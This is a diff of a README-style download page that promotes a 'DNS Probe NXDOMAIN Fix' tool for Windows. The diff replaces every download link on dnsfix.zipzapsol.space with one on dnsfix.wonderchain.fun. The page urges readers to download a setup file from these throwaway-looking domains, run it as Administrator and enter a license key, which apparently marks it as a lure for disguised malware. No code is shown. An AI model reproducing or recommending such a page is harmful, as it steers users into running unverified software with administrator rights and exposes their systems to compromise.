@@ -13,27 +13,27 @@ Fix **dns probe finished nxdomain** on Windows 10/11. This page includes a **dir
 > **This is the download page.** Use the button or link below to get **DNS Probe NXDOMAIN Fix** for Windows.
 
 <p align="center">
-  <a href="https://dnsfix.zipzapsol.space/">
+  <a href="https://dnsfix.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-DNS%20Probe%20NXDOMAIN%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download DNS Probe NXDOMAIN Fix">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[dnsfix.zipzapsol.space](https://dnsfix.zipzapsol.space/)** |
-| **Full URL** | `https://dnsfix.zipzapsol.space/` |
+| **Direct link** | **[dnsfix.wonderchain.fun](https://dnsfix.wonderchain.fun/)** |
+| **Full URL** | `https://dnsfix.wonderchain.fun/` |
 | **Type** | Fix tool for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — dnsfix.zipzapsol.space](https://dnsfix.zipzapsol.space/)** (link above)
+1. Click **[Download — dnsfix.wonderchain.fun](https://dnsfix.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://dnsfix.zipzapsol.space/"><strong>⬇ Download DNS Probe NXDOMAIN Fix now</strong></a></p>
+<p align="center"><a href="https://dnsfix.wonderchain.fun/"><strong>⬇ Download DNS Probe NXDOMAIN Fix now</strong></a></p>
 
 ---
 
